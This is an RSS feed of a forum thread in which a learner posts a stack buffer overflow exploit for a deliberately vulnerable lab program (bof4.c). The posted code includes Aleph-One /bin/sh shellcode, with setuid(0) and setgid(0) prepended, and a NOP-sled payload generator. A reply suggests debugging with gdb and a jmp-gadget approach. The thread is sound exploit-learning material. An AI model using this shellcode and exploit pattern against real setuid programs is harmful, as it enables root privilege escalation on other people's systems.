<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Buffer Overflow Exploitation - Get a Segmentation Fault (core dumped)</title>
    <link>https://0x00sec.org/t/buffer-overflow-exploitation-get-a-segmentation-fault-core-dumped/3863</link>
    <description>Hello, newbie here I want to be ask :blush:

I tried to exploiting buffer overflow. In the exploit code I use the `Aleph-One` shellcode.

    &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot;
    &quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot;
    &quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;

Exploitation is normal, but I modified a little shellcode In order to execute ` setuid(0)` and `setgid(0)`.

    &quot;\x31\xdb\x89\xd8\xb0\x17\xcd\x80&quot; // setuid(0)
    &quot;\x31\xdb\x89\xd8\xb0\x2e\xcd\x80&quot; // setgid(0)
    &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot;
    &quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot;
    &quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;

When in execution, I get the message `Illegal Instruction (core dumped)`.

    #include &lt;string.h&gt;
    #include &lt;stdio.h&gt;
    #include &lt;unistd.h&gt;
    #include &lt;stdlib.h&gt;

    char *prog = &quot;./bof4&quot;;

    char shellcode[] = 
    //&quot;\xeb\x0appssssffff&quot;
    &quot;\x31\xdb\x89\xd8\xb0\x17\xcd\x80&quot;
    &quot;\x31\xdb\x89\xd8\xb0\x2e\xcd\x80&quot;
    &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot;
    &quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot;
    &quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;;

    int main (int argc, char **argv) {
    char buff[111];
    int i, j;
    int addr;

    if (argc &gt; 1)
            sscanf(*(argv+1), &quot;%x&quot;, &amp;addr);
    else
            exit(0);
    for (i = 0; i &lt; 35; i++) {
            *(buff+i) = 0x90;
    }
    for (j = 0; j &lt; 45; j++, i++) {
            *(buff+i) = *(shellcode+j);
    }
    for (; i + 4 &lt; 110; i += 4) {
            memcpy(buff+i, &amp;addr, 4);
    }
    buff[108] = 0;
    fwrite(buff, strlen(buff), 1, stdout);
    }

bof4.c

    #include &lt;string.h&gt;
    #include &lt;stdio.h&gt;

    int main (int argc, char **argv) { 
    char bof[80];
    if (argc &gt; 1) {
		strcpy(bof, argv[1]);
		printf(&quot;You said &#39;%s&#39;\n&quot;, bof);
	}
	return(0);
    }

Then I modify it back by changing the length value of the shellcode, its value is `61 bytes`

    for (j = 0; j &lt; 61; j++, i++) {
            *(buff+i) = *(shellcode+j);
    }

I get a `Segmentation Fault  (core dumped)`

So, how to solve the problem?

Sorry for my bad english :joy:

Thank you !</description>
    
    <lastBuildDate>Thu, 12 Oct 2017 09:26:21 +0000</lastBuildDate>
    <category>Exploit Development</category>
    <atom:link href="https://0x00sec.org/t/buffer-overflow-exploitation-get-a-segmentation-fault-core-dumped/3863.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Buffer Overflow Exploitation - Get a Segmentation Fault (core dumped)</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            
          <p><a href="https://0x00sec.org/t/buffer-overflow-exploitation-get-a-segmentation-fault-core-dumped/3863/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/buffer-overflow-exploitation-get-a-segmentation-fault-core-dumped/3863/4</link>
        <pubDate>Tue, 17 Oct 2017 06:53:51 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3863-4</guid>
        <source url="https://0x00sec.org/t/buffer-overflow-exploitation-get-a-segmentation-fault-core-dumped/3863.rss">Buffer Overflow Exploitation - Get a Segmentation Fault (core dumped)</source>
      </item>
      <item>
        <title>Buffer Overflow Exploitation - Get a Segmentation Fault (core dumped)</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>If you want to know why this happens and learn from it so it never happens again, fire up gdb. Obviously your shellcode is your issue. Go all the way up to the point where it returns and then look at the instructions step by step.</p>
<p>Once you figure out what’s up, let others know what was the issue so the newbies can learn from it and then close the topic.</p>
<p>Edit:</p>
<p>Make sure the stack is indeed executable. Also, returning to the buffer isn’t the only way to ret2shellcode. There’s a much more hybrid and cleaner solution, provided the right gadget. Write your shellcode AFTER the return address and find the right gadget to return to it (hint: jmp).</p>
          <p><a href="https://0x00sec.org/t/buffer-overflow-exploitation-get-a-segmentation-fault-core-dumped/3863/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/buffer-overflow-exploitation-get-a-segmentation-fault-core-dumped/3863/3</link>
        <pubDate>Thu, 12 Oct 2017 09:19:04 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3863-3</guid>
        <source url="https://0x00sec.org/t/buffer-overflow-exploitation-get-a-segmentation-fault-core-dumped/3863.rss">Buffer Overflow Exploitation - Get a Segmentation Fault (core dumped)</source>
      </item>
      <item>
        <title>Buffer Overflow Exploitation - Get a Segmentation Fault (core dumped)</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>Whoops, never mind. I’m just bad at Linux.</p>
          <p><a href="https://0x00sec.org/t/buffer-overflow-exploitation-get-a-segmentation-fault-core-dumped/3863/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/buffer-overflow-exploitation-get-a-segmentation-fault-core-dumped/3863/2</link>
        <pubDate>Thu, 12 Oct 2017 08:17:51 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3863-2</guid>
        <source url="https://0x00sec.org/t/buffer-overflow-exploitation-get-a-segmentation-fault-core-dumped/3863.rss">Buffer Overflow Exploitation - Get a Segmentation Fault (core dumped)</source>
      </item>
      <item>
        <title>Buffer Overflow Exploitation - Get a Segmentation Fault (core dumped)</title>
        <dc:creator><![CDATA[febri]]></dc:creator>
        <description><![CDATA[
            <p>Hello, newbie here I want to be ask <img src="https://0x00sec.org/images/emoji/twitter/blush.png?v=9" title=":blush:" class="emoji" alt=":blush:"></p>
<p>I tried to exploiting buffer overflow. In the exploit code I use the <code>Aleph-One</code> shellcode.</p>
<pre><code>"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh"
</code></pre>
<p>Exploitation is normal, but I modified a little shellcode In order to execute <code> setuid(0)</code> and <code>setgid(0)</code>.</p>
<pre><code>"\x31\xdb\x89\xd8\xb0\x17\xcd\x80" // setuid(0)
"\x31\xdb\x89\xd8\xb0\x2e\xcd\x80" // setgid(0)
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh"
</code></pre>
<p>When in execution, I get the message <code>Illegal Instruction (core dumped)</code>.</p>
<pre><code>#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;

char *prog = "./bof4";

char shellcode[] = 
//"\xeb\x0appssssffff"
"\x31\xdb\x89\xd8\xb0\x17\xcd\x80"
"\x31\xdb\x89\xd8\xb0\x2e\xcd\x80"
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main (int argc, char **argv) {
char buff[111];
int i, j;
int addr;

if (argc &gt; 1)
        sscanf(*(argv+1), "%x", &amp;addr);
else
        exit(0);
for (i = 0; i &lt; 35; i++) {
        *(buff+i) = 0x90;
}
for (j = 0; j &lt; 45; j++, i++) {
        *(buff+i) = *(shellcode+j);
}
for (; i + 4 &lt; 110; i += 4) {
        memcpy(buff+i, &amp;addr, 4);
}
buff[108] = 0;
fwrite(buff, strlen(buff), 1, stdout);
}
</code></pre>
<p>bof4.c</p>
<pre><code>#include &lt;string.h&gt;
#include &lt;stdio.h&gt;

int main (int argc, char **argv) { 
char bof[80];
if (argc &gt; 1) {
	strcpy(bof, argv[1]);
	printf("You said '%s'\n", bof);
}
return(0);
}
</code></pre>
<p>Then I modify it back by changing the length value of the shellcode, its value is <code>61 bytes</code></p>
<pre><code>for (j = 0; j &lt; 61; j++, i++) {
        *(buff+i) = *(shellcode+j);
}
</code></pre>
<p>I get a <code>Segmentation Fault  (core dumped)</code></p>
<p>So, how to solve the problem?</p>
<p>Sorry for my bad english <img src="https://0x00sec.org/images/emoji/twitter/joy.png?v=9" title=":joy:" class="emoji" alt=":joy:"></p>
<p>Thank you !</p>
          <p><a href="https://0x00sec.org/t/buffer-overflow-exploitation-get-a-segmentation-fault-core-dumped/3863/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/buffer-overflow-exploitation-get-a-segmentation-fault-core-dumped/3863/1</link>
        <pubDate>Thu, 12 Oct 2017 08:07:19 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-3863-1</guid>
        <source url="https://0x00sec.org/t/buffer-overflow-exploitation-get-a-segmentation-fault-core-dumped/3863.rss">Buffer Overflow Exploitation - Get a Segmentation Fault (core dumped)</source>
      </item>
  </channel>
</rss>
